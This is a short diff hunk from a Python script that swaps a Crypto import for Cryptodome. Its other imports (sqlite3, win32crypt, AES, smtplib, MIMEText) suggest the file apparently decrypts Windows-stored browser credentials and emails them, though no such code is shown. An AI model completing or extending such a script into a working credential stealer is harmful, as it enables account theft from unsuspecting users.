@@ -5,7 +5,7 @@ import sqlite3
 import win32crypt
 from email.mime.text import MIMEText
 import smtplib
-from Crypto.Cipher import AES
+from Cryptodome.Cipher import AES
 import shutil
 from datetime import timezone, datetime, timedelta
 
